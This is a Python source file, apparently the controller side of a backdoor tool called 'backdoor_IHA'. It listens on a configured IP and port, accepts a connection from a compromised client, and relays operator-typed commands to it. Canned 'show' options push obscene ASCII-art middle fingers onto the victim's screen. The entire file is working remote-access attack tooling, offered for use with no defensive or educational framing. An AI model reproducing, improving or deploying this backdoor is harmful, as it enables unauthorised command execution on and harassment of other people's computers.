import socket
import threading
import os
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

read_ip = open("/usr/share/backdoor_IHA/ip", 'r')
ip = read_ip.read()
ip = ip.replace('\n', '')
ip = ip.replace(' ', '')
read_ip.close()
read_port = open("/usr/share/backdoor_IHA/port", 'r')
port = read_port.read()
port = port.replace('\n', '')
port = port.replace(' ', '')
read_port.close()

def use_command():
    print("show <any message>       show message on the client screen")
    print("show 1 or 2 or 3         show a mid finger ascii art on the client screen")
    print("cls                      clear the client screen")
    print("exit                     exit from client side")


server.bind((ip, int(port)))
try:
    server.listen()
    print("listening ip: {}".format(ip))
    print("listening port: {}".format(port))
    print("listening...")
except KeyboardInterrupt:
    exit()

client , addr = server.accept()
print("Connected")
while True:
    data = client.recv(24576)
    data1 = str(data, 'utf-8')
    print(data1, end='')
    try:
        send_data = input("\033[1;34m")
    except KeyboardInterrupt:
        exit()
    if not send_data:
        send_data = 'printf ""'
    elif send_data == 'help':
        use_command()
        send_data = 'printf ""'
    elif send_data == 'exit':
        send_data = 'exit()'
    elif send_data[:4] == 'show':
        if '1' in send_data:
            send_data = "show \n\n\n\n \t\t\t$$$$\n\t\t      $$    $$\n\t\t      $$    $$\n\t\t      $$    $$\n\t\t      $$    $$\n\t\t      $$    $$\n\t          $$$$$$    $$$$$$\n\t        $$    $$    $$    $$$$\n\t        $$    $$    $$    $$  $$\n\t$$$$$$  $$    $$    $$   $$    $$\n\t$$    $$$$\t\t  $$    $$\n\t$$      $$\t\t\t$$\n\t  $$    $$\t\t\t$$\n\t   $$$  $$\t\t        $$\n\t    $$ \t\t\t\t$$\n\t     $$$\t\t        $$\n\t      $$\t\t      $$$\n\t       $$\t\t      $$\n\t       $$\t\t      $$\n\t\t$$$\t\t    $$$\n\t\t  $$$_______________$$\n\t\t  $$$$$$$$$$$$$$$$$$$$\n"
        elif '2' in send_data:
            send_data = 'show \n\n\n\n                     /"\\\n                    |\\./|\n                    |   |\n                    |   |\n                    |>~<|\n                    |   |\n                 /\'\\|   |/\'\\..\n             /~\\|   |   |   | \\\n            |   =[@]=   |   |  \\\n            |   |   |   |   |   \\\n            | ~   ~   ~   ~ |`   )\n            |                   /\n             \\                 /\n              \\               /\n               \\    _____    /\n                |--//\'\'`\\--|\n                | (( +==)) |\n                |--\\_|_//--|\n\n'
        elif '3' in send_data:
            send_data = 'show\n\n\n\n\t        _____\n\t       |     |\n\t       |\\___/|\n\t       |     |\n\t       |     |\n\t       |     |\n\t   ____|_____|____\n\t  /    |     |     \\\n\t /     |     |    | \\\n\t|      |     |    |  |\n\t|      |     |    |  |\n\t|                 |  |\n\t|                 |  |\n\t|                   /\n\t \\                 /\n\t  \\               /\n\t   |             |\n\t   |             |\n'
        else:
            send_data = send_data
    data1 = bytes(send_data, 'utf-8')
    client.send(data1)
